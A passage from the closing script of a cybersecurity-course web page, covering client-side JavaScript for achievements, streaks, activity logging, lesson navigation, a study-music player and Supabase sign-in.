          showToast("Error marking course as complete", "error");
        }
      }

      // =====================================================
      // ACHIEVEMENT INTEGRATION SYSTEM
      // =====================================================
      async function checkAndUnlockAchievement(
        achievementId,
        skipNotification = false
      ) {
        try {
          // Prevent duplicate checks
          const cacheKey = `achievement_${achievementId}_${currentUser.id}`;
          if (sessionStorage.getItem(cacheKey)) return false;

          // Check if already unlocked
          const { data: existing, error } = await supabase
            .from("user_achievements")
            .select("id")
            .eq("user_id", currentUser.id)
            .eq("achievement_id", achievementId)
            .single();

          if (existing) {
            sessionStorage.setItem(cacheKey, "true");
            return false;
          }

          // Award achievement
          const achievementData = {
            user_id: currentUser.id,
            achievement_id: achievementId,
            unlocked_at: new Date().toISOString(),
            points_awarded: getAchievementPoints(achievementId),
            context: "course_system",
          };

          const { data, error: insertError } = await supabase
            .from("user_achievements")
            .insert([achievementData])
            .select()
            .single();

          if (insertError) {
            if (insertError.code === "23505") return false; // Already exists
            throw insertError;
          }

          // Update user points
         await supabase.rpc('increment_user_stats', {
  user_id_param: currentUser.id,
  points_to_add: achievementData.points_awarded,
  achievements_to_add: 1
});

          // Cache and queue notification
          sessionStorage.setItem(cacheKey, "true");

          if (!skipNotification) {
            queueAchievementNotification({
              id: achievementId,
              name: getAchievementName(achievementId),
              description: getAchievementDescription(achievementId),
              points: achievementData.points_awarded,
              rarity: getAchievementRarity(achievementId),
              icon: getAchievementIcon(achievementId),
            });
          }

          return true;
        } catch (error) {
          console.error("Error unlocking achievement:", error);
          return false;
        }
      }

      // Helper functions for achievement data (replace with your actual achievement definitions)
      function getAchievementPoints(id) {
        const pointsMap = {
          first_course_start: 75,
          first_lesson: 100,
          course_completion_1: 500,
          perfect_score: 250,
          speed_demon: 750,
          marathon_learner: 500,
          night_owl: 200,
          early_bird: 200,
          weekend_warrior: 150,
          // Add more as needed
        };
        return pointsMap[id] || 100;
      }

      function getAchievementName(id) {
        const nameMap = {
          first_course_start: "Learning Initiated",
          first_lesson: "First Steps",
          course_completion_1: "Course Conqueror",
          perfect_score: "Perfectionist",
          speed_demon: "Speed Demon",
          // Add more as needed
        };
        return nameMap[id] || "Achievement Unlocked";
      }

      function getAchievementDescription(id) {
        const descMap = {
          first_course_start: "Start your first cybersecurity course",
          first_lesson: "Complete your first lesson",
          course_completion_1: "Complete your first course",
          perfect_score: "Score 100% on any quiz",
          speed_demon: "Complete a course in under 2 hours",
          // Add more as needed
        };
        return descMap[id] || "Achievement description";
      }

      function getAchievementRarity(id) {
        const rarityMap = {
          first_course_start: "common",
          first_lesson: "bronze",
          course_completion_1: "silver",
          perfect_score: "gold",
          speed_demon: "legendary",
          // Add more as needed
        };
        return rarityMap[id] || "common";
      }

      function getAchievementIcon(id) {
        const iconMap = {
          first_course_start: "fas fa-play",
          first_lesson: "fas fa-baby",
          course_completion_1: "fas fa-trophy",
          perfect_score: "fas fa-star",
          speed_demon: "fas fa-rocket",
          // Add more as needed
        };
        return iconMap[id] || "fas fa-award";
      }

      async function checkLessonAchievements(lessonNumber) {
        if (lessonNumber === 1) {
          await checkAndUnlockAchievement("first_lesson");
        }

        // Check if user has completed multiple lessons in one day
        const today = new Date().toISOString().split("T")[0];
        const todayCompletions = Object.values(courseProgress).filter(
          (p) => p.completed && p.completedAt?.startsWith(today)
        ).length;

        if (todayCompletions >= 3) {
          await checkAndUnlockAchievement("lesson_marathon");
        }
      }

      async function checkLessonCompletionAchievements() {
        const completedCount = getCompletedLessonsCount();

        // Lesson-based achievements
        const lessonMilestones = [1, 5, 10, 25, 50, 100];
        for (const milestone of lessonMilestones) {
          if (completedCount >= milestone) {
            await checkAndUnlockAchievement(`lessons_${milestone}`);
          }
        }

        // Course completion achievements
        if (completedCount === COURSE_DATA.lessons.length) {
          await checkAndUnlockAchievement("course_completion_1");

          // Check for additional course completion achievements
          const { data: allCourses } = await supabase
            .from("course_progress")
            .select("course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100);

          const totalCompleted = allCourses?.length || 0;

          const courseMilestones = [1, 5, 10, 25];
          for (const milestone of courseMilestones) {
            if (totalCompleted >= milestone) {
              await checkAndUnlockAchievement(`course_completion_${milestone}`);
            }
          }
        }
      }

      async function checkPerfectScoreAchievements(score) {
        if (score === 100) {
          await checkAndUnlockAchievement("perfect_score");

          // Check for consecutive perfect scores
          const recentScores = Object.values(courseProgress)
            .filter((p) => p.completed && p.quizScore)
            .slice(-5) // Last 5 completed
            .map((p) => p.quizScore);

          if (
            recentScores.length >= 3 &&
            recentScores.every((s) => s === 100)
          ) {
            await checkAndUnlockAchievement("perfectionist_streak");
          }
        }
      }

      async function checkSpeedCompletionAchievements(completionTime) {
        // Speed demon: Complete course in under 2 hours (120 minutes)
        if (completionTime <= 120) {
          await checkAndUnlockAchievement("speed_demon");
        }

        // Quick learner: Complete course in under 4 hours (240 minutes)
        if (completionTime <= 240) {
          await checkAndUnlockAchievement("quick_learner");
        }
      }

      async function checkStudyTimeAchievements() {
        const totalTime = courseSession.totalStudyTime;

        // Marathon learner: Study for 8+ hours in a course session
        if (totalTime >= 480) {
          // 8 hours
          await checkAndUnlockAchievement("marathon_learner");
        }

        // Dedicated learner: Study for 4+ hours
        if (totalTime >= 240) {
          // 4 hours
          await checkAndUnlockAchievement("dedicated_learner");
        }
      }

      async function checkCourseStreakAchievements() {
        try {
          // Check for consecutive course completions
          const { data: recentCourses, error } = await supabase
            .from("course_progress")
            .select("completed_at, course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100)
            .order("completed_at", { ascending: false })
            .limit(10);

          if (error || !recentCourses) return;

          // Check for courses completed on consecutive days
          let consecutiveDays = 1;
          for (let i = 1; i < recentCourses.length; i++) {
            const prevDate = new Date(
              recentCourses[i - 1].completed_at
            ).toDateString();
            const currentDate = new Date(
              recentCourses[i].completed_at
            ).toDateString();
            const dayDiff =
              Math.abs(new Date(prevDate) - new Date(currentDate)) /
              (1000 * 60 * 60 * 24);

            if (dayDiff <= 1) {
              consecutiveDays++;
            } else {
              break;
            }
          }

          if (consecutiveDays >= 3) {
            await checkAndUnlockAchievement("learning_streak");
          }
        } catch (error) {
          console.error("Error checking course streak achievements:", error);
        }
      }

      // =====================================================
      // TIME-BASED ACHIEVEMENTS
      // =====================================================
      async function checkTimeBasedAchievements(timestamp) {
        const hour = timestamp.getHours();
        const dayOfWeek = timestamp.getDay();

        // Night owl (after midnight, before 6 AM)
        if (hour >= 0 && hour < 6) {
          await incrementTimeBasedCounter("midnight_sessions", "night_owl");
        }

        // Early bird (4 AM to 6 AM)
        if (hour >= 4 && hour < 6) {
          await incrementTimeBasedCounter("early_sessions", "early_bird");
        }

        // Weekend warrior (Saturday = 6, Sunday = 0)
        if (dayOfWeek === 0 || dayOfWeek === 6) {
          await incrementTimeBasedCounter(
            "weekend_sessions",
            "weekend_warrior"
          );
        }
      }

      async function incrementTimeBasedCounter(counterType, achievementId) {
        try {
          const dateStr = new Date().toISOString().split("T")[0];
          const cacheKey = `${counterType}_${currentUser.id}_${dateStr}`;

          // Prevent multiple increments per day
          if (sessionStorage.getItem(cacheKey)) return;

          // Update counter
          await supabase
            .from("profiles")
            .update({
              [counterType]: supabase.sql`${counterType} + 1`,
            })
            .eq("id", currentUser.id);

          // Cache to prevent double counting
          sessionStorage.setItem(cacheKey, "true");

          // Check related achievement
          if (achievementId) {
            await checkAndUnlockAchievement(achievementId, true);
          }
        } catch (error) {
          console.error(`Error incrementing ${counterType}:`, error);
        }
      }

      async function checkDailyStreak() {
        try {
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("last_activity, current_streak, last_streak_date")
            .eq("id", currentUser.id)
            .single();

          if (error) throw error;

          const now = new Date();
          const today = now.toDateString();
          const lastActivity = profile.last_activity
            ? new Date(profile.last_activity)
            : null;
          const lastStreakDate = profile.last_streak_date
            ? new Date(profile.last_streak_date).toDateString()
            : null;

          let newStreak = profile.current_streak || 0;
          let shouldUpdateStreak = false;

          if (!lastActivity) {
            // First time user
            newStreak = 1;
            shouldUpdateStreak = true;
          } else {
            const daysSinceLastActivity = Math.floor(
              (now - lastActivity) / (1000 * 60 * 60 * 24)
            );

            if (lastStreakDate === today) {
              // Already counted today's streak
              return newStreak;
            } else if (
              daysSinceLastActivity === 1 ||
              (daysSinceLastActivity === 0 && lastStreakDate !== today)
            ) {
              // Consecutive day or same day but not counted yet
              newStreak += 1;
              shouldUpdateStreak = true;
            } else if (daysSinceLastActivity > 1) {
              // Streak broken
              newStreak = 1;
              shouldUpdateStreak = true;
            }
          }

          if (shouldUpdateStreak) {
            await supabase
              .from("profiles")
              .update({
                current_streak: newStreak,
                last_activity: now.toISOString(),
                last_streak_date: now.toISOString(),
              })
              .eq("id", currentUser.id);

            userStats.current_streak = newStreak;

            showToast(`Daily streak: ${newStreak} days!`, "success");
            await checkStreakAchievements(newStreak);
          }

          return newStreak;
        } catch (error) {
          console.error("Error checking daily streak:", error);
          return 0;
        }
      }

      async function checkStreakAchievements(currentStreak) {
        const streakMilestones = [3, 7, 14, 30, 100, 365];

        for (const milestone of streakMilestones) {
          if (currentStreak >= milestone) {
            await checkAndUnlockAchievement(`streak_${milestone}`);
          }
        }
      }

      // =====================================================
      // USER ACTIVITY LOGGING
      // =====================================================
      async function logUserActivity(activityType, metadata = {}) {
        try {
          const now = new Date();

          const activityData = {
            user_id: currentUser.id,
            activity_type: activityType,
            timestamp: now.toISOString(),
            course_id: COURSE_DATA.id,
            lesson_index: currentLessonIndex,
            session_duration: courseSession.totalStudyTime,
            metadata: JSON.stringify(metadata),
            created_at: now.toISOString(),
          };

          // Try to log to activities table
          const { error } = await supabase
            .from("user_activities")
            .insert([activityData]);

          if (error && error.code !== "42P01") {
            console.warn("Activity logging failed:", error.message);
          }

          // Always update last activity in profile
          await supabase
            .from("profiles")
            .update({ last_activity: now.toISOString() })
            .eq("id", currentUser.id);
        } catch (error) {
          console.error("Error logging user activity:", error);
        }
      }

      // =====================================================
      // NAVIGATION SYSTEM
      // =====================================================
      function updateNavigationButtons() {
        const prevBtn = document.getElementById("prevLessonBtn");
        const nextBtn = document.getElementById("nextLessonBtn");

        if (!prevBtn || !nextBtn) return;

        // Previous button
        prevBtn.disabled = currentLessonIndex === 0;

        // Next button logic
        const isLastLesson =
          currentLessonIndex === COURSE_DATA.lessons.length - 1;
        const canGoNext =
          currentLessonIndex < COURSE_DATA.lessons.length - 1 &&
          canAccessLesson(currentLessonIndex + 1);

        if (isLastLesson) {
          const isCurrentCompleted =
            courseProgress[COURSE_DATA.lessons[currentLessonIndex].id]
              ?.completed;
          nextBtn.disabled = !isCurrentCompleted;
          nextBtn.innerHTML = '<i class="fas fa-trophy"></i> Complete Course';
        } else {
          nextBtn.disabled = !canGoNext;
          nextBtn.innerHTML = 'Next <i class="fas fa-chevron-right"></i>';
        }
      }

      // Navigation button event handlers
      function goToPreviousLesson() {
        if (currentLessonIndex > 0) {
          trackLessonTime(); // Track time spent on current lesson
          currentLessonIndex--;
          loadLesson(currentLessonIndex);
        }
      }

      function goToNextLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          const canGoNext = canAccessLesson(currentLessonIndex + 1);
          if (canGoNext) {
            trackLessonTime();
            currentLessonIndex++;
            loadLesson(currentLessonIndex);
          } else {
            showToast("Complete the current lesson quiz to proceed", "warning");
          }
        } else {
          // Complete course
          completeCourse();
        }
      }

      // =====================================================
      // SIDEBAR FUNCTIONS
      // =====================================================
      function toggleSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.toggle("open");
        if (overlay) overlay.classList.toggle("active");
      }

      function closeSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.remove("open");
        if (overlay) overlay.classList.remove("active");
      }

      // =====================================================
      // ACHIEVEMENT NOTIFICATION SYSTEM
      // =====================================================
      function queueAchievementNotification(achievement) {
        notificationQueue.push(achievement);
        processNotificationQueue();
      }

      function processNotificationQueue() {
        if (isShowingNotification || notificationQueue.length === 0) return;

        isShowingNotification = true;
        const achievement = notificationQueue.shift();
        showAchievementNotification(achievement);

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          isShowingNotification = false;
          processNotificationQueue();
        }, duration + 500);
      }

      function showAchievementNotification(achievement) {
        const notification = document.getElementById("achievementNotification");
        if (!notification) return;

        const icon = document.getElementById("notificationIcon");
        const title = document.getElementById("notificationTitle");
        const description = document.getElementById("notificationDescription");
        const points = document.getElementById("notificationPoints");

        if (icon) {
          icon.innerHTML = `<i class="${achievement.icon}"></i>`;
          icon.className = `notification-icon ${achievement.rarity}`;
        }
        if (title) title.textContent = achievement.name;
        if (description) description.textContent = achievement.description;
        if (points) points.textContent = `+${achievement.points} Points`;

        notification.className = `achievement-notification ${achievement.rarity}`;
        notification.classList.add("show");

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          notification.classList.remove("show");
        }, duration);
      }

      // =====================================================
      // UTILITY FUNCTIONS
      // =====================================================
      function calculateAverageQuizScore() {
        const scores = Object.values(courseProgress)
          .filter((p) => p.completed && p.quizScore)
          .map((p) => p.quizScore);

        if (scores.length === 0) return 0;
        return Math.round(
          scores.reduce((sum, score) => sum + score, 0) / scores.length
        );
      }

      async function resetProgress() {
        if (
          !confirm(
            "Are you sure you want to reset your progress? This action cannot be undone."
          )
        ) {
          return;
        }

        try {
          // Track lesson time before reset
          trackLessonTime();

          // Reset local state
          courseProgress = {};
          currentLessonIndex = 0;
          courseSession = {
            startTime: new Date(),
            totalStudyTime: 0,
            lessonsStarted: 0,
            lessonsCompleted: 0,
            pageLoadTime: new Date(),
            interactionCount: 0,
            lastActivityTime: new Date(),
          };

          // Delete from database
          await supabase
            .from("course_progress")
            .delete()
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Log reset activity
          logUserActivity("progress_reset", {
            course_id: COURSE_DATA.id,
            reset_reason: "manual",
          });

          // Reinitialize
          await saveProgress();
          renderSidebar();
          loadLesson(0);

          showToast("Progress reset successfully", "success");
        } catch (error) {
          console.error("Error resetting progress:", error);
          showToast("Failed to reset progress", "error");
        }
      }

      function copyCode(codeId) {
        const codeElement = document.getElementById(codeId);
        if (!codeElement) return;

        const text = codeElement.textContent;

        navigator.clipboard
          .writeText(text)
          .then(() => {
            showToast("Code copied to clipboard!", "success");

            // Track code copy for achievements
            logUserActivity("code_copied", {
              code_section: codeId,
              lesson_id: COURSE_DATA.lessons[currentLessonIndex].id,
            });
          })
          .catch((err) => {
            console.error("Failed to copy code:", err);
            showToast("Failed to copy code", "error");

            // Fallback for older browsers
            const textArea = document.createElement("textarea");
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            try {
              document.execCommand("copy");
              showToast("Code copied to clipboard!", "success");
            } catch (fallbackError) {
              showToast(
                "Copy failed - please select and copy manually",
                "error"
              );
            }
            document.body.removeChild(textArea);
          });
      }

      function escapeHtml(text) {
        const div = document.createElement("div");
        div.textContent = text;
        return div.innerHTML;
      }

      // =====================================================
      // UI FEEDBACK SYSTEMS
      // =====================================================
      function showToast(message, type = "success") {
        const toast = document.getElementById("toast");
        const messageEl = document.getElementById("toastMessage");

        if (!toast || !messageEl) {
          console.log(`Toast: ${message} (${type})`);
          return;
        }

        messageEl.textContent = message;
        toast.className = `toast ${type} show`;

        setTimeout(() => {
          toast.classList.remove("show");
        }, 4000);
      }

      function showLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) loadingScreen.classList.remove("hidden");
      }

      function hideLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) {
          setTimeout(() => {
            loadingScreen.classList.add("hidden");
          }, 1000);
        }
      }

      // =====================================================
      // MUSIC PLAYER INTEGRATION
      // =====================================================
      function initMusicPlayer() {
        const btnText = document.getElementById("music-button-text");
        const icon = document.getElementById("music-icon");
        const dropdown = document.getElementById("music-dropdown-content");

        if (!btnText || !icon || !dropdown) return;

        function setUI(state) {
          btnText.textContent =
            state === "Playing" ? "PAUSE MUSIC" : "STUDY MUSIC";
          icon.className =
            state === "Playing"
              ? "fa-solid fa-circle-pause"
              : "fa-solid fa-music";
        }

        // Load saved music state
        const savedSrc = localStorage.getItem("cybersec_music_src");
        const savedTime = parseFloat(
          localStorage.getItem("cybersec_music_time") || 0
        );

        if (savedSrc) {
          audioPlayer.src = savedSrc;
          audioPlayer.currentTime = savedTime;
          audioPlayer
            .play()
            .then(() => setUI("Playing"))
            .catch(() => setUI("Stopped"));
        }

        // Music button click handler
        document
          .getElementById("music-dropdown")
          .querySelector("button")
          .addEventListener("click", (e) => {
            e.stopPropagation();
            dropdown.style.display =
              dropdown.style.display === "block" ? "none" : "block";

            if (audioPlayer.src && !audioPlayer.paused) {
              audioPlayer.pause();
              setUI("Stopped");
            } else if (audioPlayer.src) {
              audioPlayer.play().then(() => setUI("Playing"));
            }
          });

        // Music selection handlers
        dropdown.querySelectorAll("a[data-src]").forEach((link) => {
          link.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.src = link.dataset.src;
            audioPlayer.play().then(() => setUI("Playing"));
            localStorage.setItem("cybersec_music_src", link.dataset.src);
            dropdown.style.display = "none";
          });
        });

        // Stop music handler
        const stopLink = document.getElementById("stop-music-link");
        if (stopLink) {
          stopLink.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.pause();
            audioPlayer.currentTime = 0;
            audioPlayer.removeAttribute("src");
            setUI("Stopped");
            localStorage.removeItem("cybersec_music_src");
            localStorage.removeItem("cybersec_music_time");
            dropdown.style.display = "none";
          });
        }

        // Save music state before page unload
        window.addEventListener("beforeunload", () => {
          if (!audioPlayer.paused && audioPlayer.src) {
            localStorage.setItem("cybersec_music_src", audioPlayer.src);
            localStorage.setItem(
              "cybersec_music_time",
              audioPlayer.currentTime
            );
          }
        });

        // Close dropdown when clicking outside
        window.addEventListener("click", (e) => {
          if (!e.target.closest("#music-dropdown")) {
            dropdown.style.display = "none";
          }
        });
      }

      // Show initial music indicator
      function addMusicIndicator() {
        const musicBtn = document.querySelector("#music-dropdown");
        if (musicBtn) {
          const indicator = document.createElement("div");
          indicator.className = "music-indicator";
          indicator.innerHTML = `<i class="fa-solid fa-music"></i> Try Study Music!`;

          musicBtn.style.position = "relative";
          musicBtn.appendChild(indicator);

          setTimeout(() => indicator.remove(), 3000);
        }
      }

      // Initialize Event Listeners
      function initializeEventListeners() {
        // Navigation buttons
        document
          .getElementById("prevLessonBtn")
          ?.addEventListener("click", goToPreviousLesson);
        document
          .getElementById("nextLessonBtn")
          ?.addEventListener("click", goToNextLesson);

        // Reset progress button
        document
          .getElementById("resetProgressBtn")
          ?.addEventListener("click", resetProgress);

        // Mobile menu toggle
        document
          .getElementById("menuToggle")
          ?.addEventListener("click", toggleSidebar);
        document
          .getElementById("sidebarOverlay")
          ?.addEventListener("click", closeSidebar);

        // Keyboard shortcuts
        document.addEventListener("keydown", handleKeyboardShortcuts);

        // Window resize handler
        window.addEventListener("resize", handleWindowResize);

        // Content interaction tracking
        document.getElementById("contentBody")?.addEventListener(
          "scroll",
          debounce(() => {
            trackUserInteraction();
          }, 1000)
        );
      }

      // Keyboard Shortcuts
      function handleKeyboardShortcuts(e) {
        if (document.querySelector(".quiz-question.active")) return;

        if (e.key === "ArrowLeft" && e.ctrlKey) {
          e.preventDefault();
          goToPreviousLesson();
        } else if (e.key === "ArrowRight" && e.ctrlKey) {
          e.preventDefault();
          goToNextLesson();
        }
      }

      // Window Resize Handler
      function handleWindowResize() {
        if (window.innerWidth > 768) {
          closeSidebar();
        }
      }

      // Debounce Helper
      function debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
          const later = () => {
            clearTimeout(timeout);
            func(...args);
          };
          clearTimeout(timeout);
          timeout = setTimeout(later, wait);
        };
      }

      // Initialize responsive behavior
      if (window.innerWidth <= 768) {
        document.getElementById("menuToggle").style.display = "inline-flex";
      }

      // Auto-save progress periodically
      setInterval(async () => {
        if (currentUser && Object.keys(courseProgress).length > 0) {
          await saveProgress();
        }
      }, 60000); // Save every minute

      // System initialization logging
      console.log("CyberSec Academy Course System Initialized");
      console.log("Current Course:", COURSE_DATA.title);
      console.log("Total Lessons:", COURSE_DATA.lessons.length);

      // Google OAuth Integration
      const googleBtn = document.querySelector(".btn-google");
      if (googleBtn) {
        googleBtn.addEventListener("click", async () => {
          const { data, error } = await supabase.auth.signInWithOAuth({
            provider: "google",
            options: {
              redirectTo:
                window.location.origin +
                "/courses/living-off-the-land-course.html",
            },
          });

          if (error) {
            console.error("Google login error:", error.message);
            showToast("Google login failed: " + error.message, "error");
          }
        });
      }

      // Check for existing session
      supabase.auth.getSession().then(({ data }) => {
        if (data.session) {
          console.log("User already logged in:", data.session.user);
          currentUser = data.session.user;
          startCourseSession();
        }
      });

      // Add missing auth modal functions
      function openAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "flex";
        }
      }

      function closeAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "none";
        }
      }

      // Add auth tab switching functionality
      document.getElementById("tabSignIn")?.addEventListener("click", () => {
        document.getElementById("tabSignIn").classList.add("active");
        document.getElementById("tabSignUp").classList.remove("active");
        document.getElementById("signInForm").style.display = "block";
        document.getElementById("signUpForm").style.display = "none";
      });

      document.getElementById("tabSignUp")?.addEventListener("click", () => {
        document.getElementById("tabSignUp").classList.add("active");
        document.getElementById("tabSignIn").classList.remove("active");
        document.getElementById("signUpForm").style.display = "block";
        document.getElementById("signInForm").style.display = "none";
      });

      document
        .getElementById("closeAuthModal")
        ?.addEventListener("click", closeAuthModal);

      // Improved error handling for auth session
      supabase.auth.onAuthStateChange((event, session) => {
        if (event === "SIGNED_IN") {
          currentUser = session.user;
          closeAuthModal();
          startCourseSession();
        } else if (event === "SIGNED_OUT") {
          currentUser = null;
          openAuthModal();
        }
      });

      // Add form submission handlers
      document
        .getElementById("emailSignInForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signInEmail").value;
          const password = document.getElementById("signInPassword").value;

          try {
            const { data, error } = await supabase.auth.signInWithPassword({
              email,
              password,
            });

            if (error) throw error;

            closeAuthModal();
          } catch (error) {
            showToast(error.message, "error");
          }
        });

      document
        .getElementById("emailSignUpForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signUpEmail").value;
          const password = document.getElementById("signUpPassword").value;
          const name = document.getElementById("signUpName").value;

          try {
            const { data, error } = await supabase.auth.signUp({
              email,
              password,
              options: {
                data: {
                  full_name: name,
                },
              },
            });

            if (error) throw error;

            showToast(
              "Account created successfully! Please check your email.",
              "success"
            );
          } catch (error) {
            showToast(error.message, "error");
          }
        });
    </script>
  </body>
</html>

